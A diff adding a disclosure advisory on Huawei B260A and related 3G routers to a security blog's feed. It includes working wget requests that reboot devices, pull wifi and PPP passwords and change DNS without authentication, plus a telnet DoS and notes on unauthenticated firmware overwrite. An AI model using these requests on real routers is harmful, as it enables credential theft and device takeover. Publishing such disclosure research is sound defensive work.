@@ -4,6 +4,200 @@
     <title>A slice of Kimchi - IT Security Blog</title>
     
     <entry>
+        <title>A comprehensive study of Huawei 3G routers - XSS, CSRF, DoS, unauthenticated firmware update, RCE</title>
+        <link href="2015-10-07-Huawei-routers-vulnerable-to-multiple-threats.html"/>
+        <content type="html"><h2>Product Description</h2>
+<p>Huawei Technologies Co. Ltd. is a Chinese multinational networking and telecommunications equipment and services company.
+It is the largest telecommunications equipment manufacturer in the world.</p>
+<h2>Vulnerabilities Summary</h2>
+<p>The Huawei B260A device is a 3g modem / access point overall badly designed with a lot of vulnerabilities. The device is provided by Orange Tunisia as a "Flybox". It's available in a lot of countries to provide Internet with a 3G network (Vodafone provides this device, for example). </p>
+<p>The tests below are done using the last available firmware (firmware 846.11.15.08.115 - Feb 20 2013).</p>
+<p>Note: This firmware seems to be used for these 14 Huawei devices (from http://192.168.1.1/js/u_version.js ) which, therefore, are likely to be vulnerable to the same threats:</p>
+<ul>
+<li>E960, WLA1GCPU</li>
+<li>E968, WLA1GCYU</li>
+<li>B970, WLA1GAPU</li>
+<li>B932, WLB1TIPU</li>
+<li>B933, WLB1TIPU</li>
+<li>B220, WLA1GCYU</li>
+<li>B260, WLA1GCYU</li>
+<li>B270, WLA1GCYU</li>
+<li>B972, WLA1GCYU</li>
+<li>B200-20, WLB3TILU</li>
+<li>B200-30, WLB3TILU</li>
+<li>B200-40, WLB3TILU</li>
+<li>B200-50, WLB3TILU</li>
+<li>??, WLA1GCPU</li>
+</ul>
+<h2>Details - Cookies</h2>
+<p>The Huawei B260A stores the administrator's account name and password in cleartext in a cookie (using base64),
+which allows context-dependent attackers to obtain sensitive information by(1) reading a cookie file
+and (2) sniffing the network for HTTP headers, and possibly (3) using unspecified other vectors. </p>
+<p>The cookie is:</p>
+<pre><code>Cookie: Basic=admin:base64(password):0
+</code></pre>
+<h2>Details - Authentication bypass</h2>
+<p>Remote reboot without authentication:</p>
+<pre><code>wget -qO- --post-data='action=Reboot&amp;page=resetrouter.asp' http://192.168.1.1/en/apply.cgi
+</code></pre>
+<p>Second remote reboot without authentication:</p>
+<pre><code>wget -qO- --post-data='action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
+</code></pre>
+<p>Grab wifi password without authentication:</p>
+<pre><code>wget -qO- 'http://192.168.1.1/js/wlan_cfg.js'|less
+</code></pre>
+<p>Get PPP passwords without authentication:</p>
+<pre><code>wget -qO- 'http://192.168.1.1/js/connection.js'|grep -i 'var profile'
+var profile = [["Orange TN","*99#","FIXME","FIXME","0","flyboxgp","1","","0",],[]];
+</code></pre>
+<p>Grab informations (wifi password, PPP passwords) without authentication:</p>
+<pre><code>wget -qO- http://192.168.1.1/js/wizard.js
+var current_profile_list = ["Orange TN","*99#","","","0","flyboxgp","1","",];
+var profile = [["Orange TN","*99#","","","0","flyboxgp","1","",],[]];
+var nv_wl_wpa_psk = "E56479874EB39DB3BC65D8374B";              /**/
+var nv_wl_key1 = "";                    /**/
+[...]
+</code></pre>
+<h2>Details - CSRF without authentication</h2>
+<p>Change remote DNS without authentication: it allows an attacker to change the upstream DNS servers, so it will impact the clients served by the local dhcpd from the Huawei B260A:</p>
+<pre><code>wget -qO- --post-data='lan_lease=86400&amp;dns_settings=static&amp;primary_dns=1.1.3.1&amp;secondary_dns=3.3.3.3&amp;lan_proto=dhcp&amp;dhcp_start=192.168.1.100&amp;dhcp_end=192.168.1.200&amp;lan_ipaddr=192.168.1.1&amp;lan_gateway=192.168.1.1&amp;lan_netmask=255.255.255.0&amp;action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
+</code></pre>
+<p>This can easily be done using a CSRF attack.</p>
+<p>Apparently, there are CSRF everywhere (<em>EVERYWHERE</em>).</p>
+<h2>Details - Remote DoS without authentication</h2>
+<p>Remote DoS against the HTTP server without authentication:</p>
+<pre><code>root@linux:~# telnet 192.168.1.1 80
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+x   
+Connection closed by foreign host.
+root@linux:~# telnet 192.168.1.1 80
+Trying 192.168.1.1...
+telnet: Unable to connect to remote host: Connection refused
+root@linux:~
+</code></pre>
+<h2>Details - Firmware upload without authentication:</h2>
+<p><a href="http://media.orange.tn/executable/maj_flyboxB260A.exe">The program (FMC tool) provided by Tunisia Telecom (from Huawei) to update the firmware sends udp packet to the broacast port 1280 udp</a>. The diag program running in the Huawei B260A replies by sending out information about the versions of the different components of the firmware. The updater tries to login using telnet (admin/admin) protocol to the modem in order to extract firmware versions (if the password is not admin, the update will continue and will work). Then the updater sends directly the files to the modem using 1280/tcp which will overwrite the MTD (Memory Technology Device, ie: flash storage) of the device without authentication:</p>
+<p>By sniffing the packets:</p>
+<p>1/ telnet connection from the official tool (with admin:admin credentials by default):</p>
+<pre><code>HGW login: ......admin
+Password: admin
+
+No directory, logging in with HOME=/
+
+BusyBox v0.60.0 (2013.02.20-03:27+0000) Built-in shell (msh)
+Enter 'help' for a list of built-in commands.
+# nvram get cfe_version
+# nvram get app_version
+#
+</code></pre>
+<p>Even if the password is not 'admin', the updating process continues on port 1280/tcp.</p>
+<p>2/ In the router, the diag program receives the data in port 1280/tcp, stores the data in files located in /tmp and then uses the <code>write</code> program in the router to overwrite the MTD.</p>
+<p>No need to reverse, by using <code>top</code> in the router, we see the <code>write</code> process:</p>
+<pre><code>1266 0         S    diagd 
+1270 0         S    telnetd 
+1822 0         R    write /tmp/uploadh1wNSR FWT  &lt;-- overwrites the MTD
+</code></pre>
+<p>write is a basic tool used to overwrite the mtdblock (<code>write /path/to/file device</code>, FWT for the MTD):</p>
+<pre><code># write
+usage: write [path] [device]
+</code></pre>
+<p>3/ After updating the firmware, you can login as admin/admin using the HTTP control panel and using telnet, allowing you to get a root shell.</p>
+<p>This is a default behavior, as stated in the official documentation from the FMC tool:</p>
+<pre><code>With this software, you can upgrade the Huawei FMC products in a very simple way.
+This software supports the upgrade of five sub-modules, including BOOT of the router module,
+APP of the router module, customized files of the router module, the wireless module,
+and the dashboard software.
+</code></pre>
+<p><a href="http://media.orange.tn/executable/maj_flyboxB260A.exe">You can get the last firmware updater at this address</a></p>
+<p>(Linux: <code>wget --user-agent="Mozilla" http://media.orange.tn/executable/maj_flyboxB260A.exe</code>)</p>
+<p>Huawei doesn't provide directly firmwares for these devices, you have to download them from your ISP.</p>
+<p>These ISPs use this router (from <a href="http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a">http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a</a> ):</p>
+<ul>
+<li>Argentina Claro</li>
+<li>Argentina Movistar</li>
+<li>Armenia Orange</li>
+<li>Austria H3G</li>
+<li>Austria Mobilkom</li>
+<li>Brazil VIVO</li>
+<li>Brazil CTBC</li>
+<li>Jamaica C&amp;W JAMAICA</li>
+<li>CTBC Brazil</li>
+<li>Chile Entel</li>
+<li>Croatia Vipnet</li>
+<li>Danmark Hi3G</li>
+<li>Ecuador CNT</li>
+<li>Estonia Elisa Eesti</li>
+<li>Germany E-Plus</li>
+<li>Guatemala Tigo</li>
+<li>JAMAICA C&amp;W</li>
+<li>Jamaica Digicel</li>
+<li>Kenya Orange</li>
+<li>Mali Orange</li>
+<li>Mexico Telcel</li>
+<li>Niger Orange</li>
+<li>Portugal Optimus</li>
+<li>Portugal VDF</li>
+<li>Roumania Vodafone</li>
+<li>Slovak Telekom</li>
+<li>Slovak Orange</li>
+<li>Sweden HI3G</li>
+<li>Sweden TELE2</li>
+<li>Sweden Tele2</li>
+<li>Tele2 Germany</li>
+<li>Telia Sweden</li>
+<li>Tunisia Orange</li>
+</ul>
+<p>From my research, it is possible to overwrite the default firmware with a custom one without authentication.</p>
+<p>It is also possible to sim-unlock the device by sending packets to port 1280/udp.</p>
+<p>As stated before, this firmware seems to be used for the below devices, so the devices are likely to be vulnerable to the same threats:</p>
+<ul>
+<li>E960, WLA1GCPU</li>
+<li>E968, WLA1GCYU</li>
+<li>B970, WLA1GAPU</li>
+<li>B932, WLB1TIPU</li>
+<li>B933, WLB1TIPU</li>
+<li>B220, WLA1GCYU</li>
+<li>B260, WLA1GCYU</li>
+<li>B270, WLA1GCYU</li>
+<li>B972, WLA1GCYU</li>
+<li>B200-20, WLB3TILU</li>
+<li>B200-30, WLB3TILU</li>
+<li>B200-40, WLB3TILU</li>
+<li>B200-50, WLB3TILU</li>
+<li>??, WLA1GCPU</li>
+</ul>
+<h2>Vendor Response</h2>
+<p>The vulnerable routers are in the End Of Service cycle and will not be supported anymore.</p>
+<p>The vendor encourages people to discard existing unsupported models and to use new routers (B68L and B310).</p>
+<p><a href="http://www1.huawei.com/en/security/psirt/security-bulletins/security-notices/hw-456466.htm">Official Huawei Security Notice</a></p>
+<h2>Report Timeline</h2>
+<ul>
+<li>Aug 21, 2014: Vulnerabilities found by Pierre Kim.</li>
+<li>Aug 24, 2015: Huawei PSIRT is notified of the vulnerabilities.</li>
+<li>Aug 25, 2015: Huawei PSIRT confirms the notification.</li>
+<li>Aug 28, 2015: Huawei PSIRT confirms the vulnerabilities affecting the B260a router. The B260a router is in the End Of Service cycle and Huawei would not support B260a or provide fixed version or patch. The B68L and B310, as a substitute for B260a, are not vulnerable for the issues mentioned above and welcome to use.</li>
+<li>Aug 31, 2015: Pierre Kim asks if the other routers (E960, E968, B970, B932, B933, B220, B260, B270, B972, B200-20, B200-30, B200-40, B200-50) are vulnerable.</li>
+<li>Sep 14, 2015: Huawei PSIRT confirms all the routers have been in the End Of Service cycle.</li>
+<li>Sep 29, 2015: Huawei PSIRT asks to be notified when the advisory is posted.</li>
+<li>Oct 05, 2015: Pierre Kim asks for a CNNVD entry.</li>
+<li>Oct 05, 2015: Pierre Kim indicated he will release the advisory the Oct 07, 2015.</li>
+<li>Oct 07, 2015: A public advisory is sent to security mailing lists.</li>
+</ul>
+<h2>Credit</h2>
+<p>These vulnerabilities were found by Pierre Kim (@PierreKimSec).</p>
+<h2>Greetings</h2>
+<p>Big thanks to my friend Alexandre Torres.</p>
+<h2>References</h2>
+<p>https://pierrekim.github.io/advisories/2015-huawei-0x00.txt</p>
+<p>https://pierrekim.github.io/blog/2015-10-07-Huawei-routers-vulnerable-to-multiple-threats.html</p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p></content>
+    </entry>
+    
+    <entry>
         <title>TOTOLINK Update - How to NOT handle security issues</title>
         <link href="2015-08-13-TOTOLINK-how-to-NOT-handle-security-issues.html"/>
         <content type="html"><p>This post is an an update to:</p>
